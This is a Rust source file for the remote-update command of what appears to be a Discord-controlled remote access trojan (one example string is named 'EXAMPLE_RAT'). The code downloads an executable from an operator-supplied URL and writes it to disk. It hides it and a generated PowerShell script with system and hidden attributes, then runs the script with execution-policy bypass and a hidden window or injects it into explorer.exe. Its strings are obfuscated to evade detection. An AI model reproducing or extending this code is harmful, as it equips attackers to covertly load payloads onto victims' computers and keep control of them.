use crate::commands::*;
use crate::config::Config;
use crate::core::stego_store::{StegoStore, StringCategory};
use std::boxed::Box;
use anyhow::{anyhow, Context, Result};
use async_trait::async_trait;
use std::env;
use std::fs;
use std::os::windows::process::CommandExt;
use std::path::{Path, PathBuf};
use std::process;
use std::sync::Arc;
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::Message;

pub struct UpdateCommand;

#[async_trait]
impl BotCommand for UpdateCommand {
    fn name(&self) -> &str { "update" }
    fn description(&self) -> &str { 
        Box::leak(StegoStore::get(StringCategory::Desc, "UPDATE").into_boxed_str())
    }
    fn category(&self) -> &str { "system" }
    fn usage(&self) -> &'static str {
        Box::leak(StegoStore::get(StringCategory::CmdMeta, "UPDATE_USAGE").into_boxed_str())
    }
    fn examples(&self) -> &'static [&'static str] { 
        Box::leak(vec![
            Box::leak(format!(".update {}", StegoStore::get(StringCategory::Url, "EXAMPLE_RAT")).into_boxed_str()) as &'static str
        ].into_boxed_slice())
    }
    fn aliases(&self) -> &'static [&'static str] { &["upd"] }

    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, mut args: Arguments) -> Result<()> {
        let url = if !msg.attachments.is_empty() {
            msg.attachments[0].url.clone()
        } else if let Some(url) = args.next() {
            url.to_string()
        } else {
            http.create_message(msg.channel_id.get(), &StegoStore::get(StringCategory::CmdMeta, "UPDATE_USAGE")).await?;
            return Ok(());
        };

        self.hndl_upd(http, msg, &url).await
    }
}

impl UpdateCommand {
    async fn hndl_upd(&self, http: &Arc<HttpClient>, msg: &Message, url: &str) -> Result<()> {
        let status_msg_json = http
            .create_message(msg.channel_id.into(), &format!("Downloading update from `{}`...", url)).await?;
        let status_msg: Message = serde_json::from_str(&status_msg_json)?;

        let resp = reqwest::get(url).await.context("Failed to download file")?;
        if !resp.status().is_success() {
            http.update_message(status_msg.channel_id, status_msg.id, Some(format!("Download failed with status: {}", resp.status()))).await?;
            return Ok(());
        }
        let bytes = resp.bytes().await.context("Cant read file bytes")?;
        self.do_upd(bytes.to_vec())?;

        http.update_message(status_msg.channel_id, status_msg.id, Some(StegoStore::get(StringCategory::Const, "UPDATE_DONE"))).await?;

        tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
        process::exit(0);
    }

    fn do_upd(&self, new_exe_bytes: Vec<u8>) -> Result<()> {
        let curr_exe_path = env::current_exe().context("Couldnt find current exe path")?;
        let install_dir = curr_exe_path.parent().context("Cant get parent dir")?;
        
        fs::create_dir_all(&install_dir).ok();

        let upd_exe_name = StegoStore::get(StringCategory::Const, "UPD_EXE");
        let new_exe_path = install_dir.join(&upd_exe_name);
        fs::write(&new_exe_path, new_exe_bytes).context("Cant write new exe")?;
        
        let attrib_cmd = StegoStore::get(StringCategory::Const, "ATTRIB_CMD");
        
        // Hide the new temporary exe
        if let Some(engine) = crate::stealth::get_engine() {
            let cmd = StegoStore::get(StringCategory::Win, "KCT_ATTRIB_HIDDEN").replace("{}", &new_exe_path.to_string_lossy());
            let _ = engine.execute_stealth_cmd_with_output(&cmd);
        } else {
            let _ = process::Command::new(&attrib_cmd)
                .arg("+s")
                .arg("+h")
                .arg(&new_exe_path.to_string_lossy().to_string())
                .creation_flags(0x08000000)
                .output();
        }

        let script_content = self.gen_ps_script(&curr_exe_path, &new_exe_path)?;
        let script_name = StegoStore::get(StringCategory::Const, "UPD_SCRIPT");
        let script_path = install_dir.join(&script_name);
        fs::write(&script_path, script_content).context("Cant create update script")?;
        
        // Hide script
        if let Some(engine) = crate::stealth::get_engine() {
            let cmd = StegoStore::get(StringCategory::Win, "KCT_ATTRIB_HIDDEN").replace("{}", &script_path.to_string_lossy());
            let _ = engine.execute_stealth_cmd_with_output(&cmd);
        } else {
            let _ = process::Command::new(&attrib_cmd)
                .arg("+s")
                .arg("+h")
                .arg(&script_path.to_string_lossy().to_string())
                .creation_flags(0x08000000)
                .output();
        }

        let ps_exe = StegoStore::get(StringCategory::Const, "PS_EXE");
        if let Some(engine) = crate::stealth::get_engine() {
            // Note: ps script itself kills old exe and replaces so just passing the file path. Using execute_stealth_cmd_with_output wrapper
            let cmd = StegoStore::get(StringCategory::Win, "KCT_PS_EXEC_FILE").replace("{}", &script_path.to_string_lossy());
            // Since this kills the current process, we run it detached in another process or simply spawn it
            unsafe {
                let mut pid = 0;
                let mut sys = sysinfo::System::new_all();
                sys.refresh_processes();
                use sysinfo::{SystemExt, ProcessExt, PidExt};
                for (p, process) in sys.processes() {
                    if process.name().to_lowercase() == "explorer.exe" {
                        pid = p.as_u32(); break;
                    }
                }
                if pid != 0 {
                    let _ = engine.kct_auto_inject(pid, &cmd);
                } else {
                    let _ = engine.execute_stealth_cmd_with_output(&cmd);
                }
            }
        } else {
            process::Command::new(&ps_exe)
                .arg("-ExecutionPolicy")
                .arg("Bypass")
                .arg("-NoProfile")
                .arg("-WindowStyle")
                .arg("Hidden")
                .arg("-File")
                .arg(&script_path.to_string_lossy().to_string())
                .creation_flags(0x08000000) // CREATE_NO_WINDOW
                .spawn()
                .context("Cant run the update script")?;
        }

        Ok(())
    }

    fn gen_ps_script(&self, old_exe: &Path, new_exe: &Path) -> Result<String> {
        let old_exe_path_str = old_exe.to_string_lossy().replace("'", "''");
        let new_exe_path_str = new_exe.to_string_lossy().replace("'", "''");

        let ps_template = StegoStore::get(StringCategory::Scripts, "UPDATE_PS");
        let script = ps_template
            .replace("{old_path}", &old_exe_path_str)
            .replace("{new_path}", &new_exe_path_str);

        Ok(script)
    }
}



